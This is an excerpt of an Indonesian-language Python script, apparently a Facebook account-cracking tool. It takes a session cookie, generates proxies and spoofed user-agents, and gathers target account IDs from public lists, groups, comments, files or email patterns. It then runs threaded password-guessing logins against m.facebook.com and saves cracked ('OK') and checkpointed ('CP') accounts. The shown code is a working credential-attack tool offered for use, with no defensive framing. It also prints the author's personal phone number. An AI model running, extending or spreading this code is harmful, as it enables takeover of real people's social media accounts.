...
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#R = random.choice([m,k,h,u,b,x,p,hh,kk])
...
###---[ANGGAP INI LOGO ]---###
def logo(n):
	return str(f"""{warna_warni_biasa}██╗░░░██╗░█████╗░██████╗░███████╗
╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝
░╚████╔╝░██║░░╚═╝██████╦╝█████╗░░
░░╚██╔╝░░██║░░██╗██╔══██╗██╔══╝░░
░░░██║░░░╚█████╔╝██████╦╝██║░░░░░
...
warna_warni_biasa=random.choice([H,K,M,O,B,U,Z,P,N])
...
try:
	clear_layar()
	print(logo3())
	print(f'{warna_warni_biasa}========================================{P}')
	print(f'{M} ! DUMP PROXY DAN CRATE USER AGENT')
...
#	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K)'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f' AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Silk/3.47 like Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.117 '
...
print(f'{warna_warni_biasa}========================================{P}')
print(f'{K}<> NEW PROXY : {H}'+str(len(abcd)))
print(f'{warna_warni_biasa}========================================{P}')
print(f'{H}<> NEW USERAGENT : {K}'+str(len(redmi)))
print(f'{warna_warni_biasa}========================================{P}')
print(f'{M}RAYAN {K}GANTENG {H}BANGAT')
print(f'{warna_warni_biasa}========================================{P}')
sleep(2)
...
def login():
	...
	print(logo2())
	print(f'{warna_warni_biasa}========================================{P}')
	print(f'{H}<> {P}GUNAKAN COOKIE FRES')
	cookie = input(f"{H}• {N}Cookie Fb : {H}")
	...
	cok = {'cookie':cookie}
	#print(f'  {P}[{H}•{P}]{H}LOGIN BERHASIL.....jalankan ulang!!!{P} ');time.sleep(1)
	try:
		...
		random_kata = random.choice(["Acc Guru","Hallo Rayan Ganteng","Ah Ganteng Banget Bang Rayan Gua Salut"])
...
def menu(n,t,c,):
	...
	print(logo(n)+f'')
	print(f'{warna_warni_biasa}========================================{P}')
	print(f'{H}WELCOME  {P}: {K}'+str(n))
	print(f'{H}FACEBOOK {P}: {K}Mas Rayan')
	print(f'{H}WHATSAPP {P}: {K}085852768706')
	print(f'{H}GITHUB   {P}: {K}https://github.com/Rayan-XD')
	print(f'{M}!!! [ TOOLS FREE JANGAN NGELUH ]')
	#print(f'{H}========================================{P}')
	#print(f'{P}COOKIE : {H}'+str(c))
	#print(f'{H}========================================{P}')
	#print(f'{P}TOKEN : {K}'+str(t))
	print(f'{warna_warni_biasa}========================================{P}')
	print(f" [{hh}1{P}] CRACK PUBLIK")
	print(f" [{hh}2{P}] CRACK MASSAL")
	print(f' [{hh}3{P}] CRACK KOMENTAR')
	print(f" [{hh}4{P}] CRACK GRUP")
	print(f' [{hh}5{P}] CRACK FILE')
	print(f" [{hh}6{P}] CRACK EMAIL")
	print(f" [{hh}7{P}] HASIL CRACK")
	print(f" [{hh}8{P}] CEK AKUN NON AKTIF")
	print(f" [{hh}9{P}] CP DETEKTOR")
	print(f" [{hh}0{P}] KELUAR ({M}COOKIE{P})")
	ask = input(f' [{hh}•{P}] PILIH : ')
	print(f'{warna_warni_biasa}========================================{P}')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	#elif ask in ['99','99']:crack_foll(t,c)
	elif ask in ['3','03']:crack_komen()
	elif ask in ['4','04']:crack_group()
	elif ask in ['6','06']:clon_email()
	#elif ask in ['99','99']:crack_search()
	elif ask in ['5','05']:crack_file()
	elif ask in ['7','07']:cek_hasil()
	elif ask in ['8','08']:cek_akun()
	elif ask in ['9','09']:cek_opsi_cp()
...
def cek_opsi_cp():
	...
	exc = input(f' [{kk}•{P}] PILIH AKUN YANG AKAN DI CEK\n [{H}•{P}] {P}PILIH : ')
	file = nom[int(exc)-1]
	print(f'{warna_warni_biasa}========================================{P}')
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		...
		cek_opsi(id,pw,ua)
	exit(f'\r [{hh}•{P}] CEK OPSI CP TELAH SELESAI')
...
def cek_hasil():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] Cek Hasil {H}OK\n {P}[{hh}2{P}] Cek Hasil {K}CP\n {P}[{H}•{P}] PILIH : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
...
def clon_email():
	...
	global ok , cp
	print(f'[{hh}•{P}] CRACK DARI EMAIL , MAX 1000 ID')
	nama = input(f'[{H}•{P}] TARGET : ')
	if ',' in str(nama):
		exit(f' [{M}!{P}] masukan 1 nama saja')
	doma = input(f'[{H}•{P}] DOMAIN : ')
...
def crack_file():
	...
	print(f'\r [{hh}•{P}] total jumlah akun {len(dump)}')
	atur_atur()
	...
	try:
		...
		for pi in bas['friends']['data']:
			try:
				...
				print('\r PROSES PENGAMBILAN %s ID'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
...
def manual():
	...
	pwx = []
	print(f'{warna_warni_biasa}========================================{P}')
	B = input(f' [{hh}•{P}] MINIMAL 6 KARAKTER\n [{hh}•{P}] MASUKAN SANDI : ').split(',')
	for x in B:
		pwx.append(x)
	print(f'{warna_warni_biasa}========================================{P}')
	print(f' AKUN {H}OK{P} TERSIMPAN DI : {sim_ok}\n AKUN {K}CP{P} TERSIMPAN DI : {sim_cp}')
	print(f'{warna_warni_biasa}========================================{P}')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<>{P}] CRACK TELAH SELESAI JUMLAH {H}OK{P}:{ok} JUMLAH {K}CP{P}:{cp} ')
...
def gabung():
	...
	print(f'{warna_warni_biasa}========================================{P}')
	B = input(f' [{hh}>{P}] MINIMAL 6 KARAKTER\n [{hh}•{P}] MASUKAN SANDI  : ').split(',')
	C = input(f' [{hh}>{P}] MASUKAN NAMA BELAKANG\n [{hh}•{P}] MASUKAN SANDI : ')
	if ',' in str(C):
		exit(f" [{M}!{P}] SANDI BELAKANG 1 KATA SAJA")
	print(f'{warna_warni_biasa}========================================{P}')
	print(f' AKUN {H}OK{P} TERSIMPAN DI : {sim_ok}\n AKUN {K}CP{P} TERSIMPAN DI : {sim_cp}')
	print(f'{warna_warni_biasa}========================================{P}')
	awal = datetime.now()
